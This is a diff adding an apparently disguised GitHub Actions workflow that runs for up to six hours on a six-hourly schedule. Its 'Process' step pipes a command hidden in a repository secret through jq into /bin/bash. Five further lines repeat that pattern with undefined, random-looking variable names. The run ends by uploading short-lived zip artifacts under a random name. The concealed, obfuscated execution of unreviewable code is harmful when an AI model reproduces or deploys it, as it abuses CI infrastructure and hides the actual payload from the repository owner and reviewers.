@@ -1,0 +1,42 @@
+name: Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '47 3,9,15,21 * * *'
+permissions:
+  contents: read
+  actions: read
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  automation:
+    name: Main task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Process
+        env:
+          x64: ${{ secrets.x64 }}
+        run: |
+          printf '%s' "$x64" | jq -r .t02 | /bin/bash
+          printf '%s' "$t38422" | jq -r .lvpwh86328 | /bin/bash
+          echo $hcwbv15756 | jq -r .caemi7 | /bin/bash
+          echo $jjt314 | jq -r .sfhn6205 | /bin/bash
+          echo $gqbcb1256 | jq -r .rv492 | /bin/bash
+          echo $ue36281 | jq -r .hkx601 | /bin/bash
+
+      - name: Store results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: VpAcTrY6
+          path: "*.zip"
+          retention-days: 1
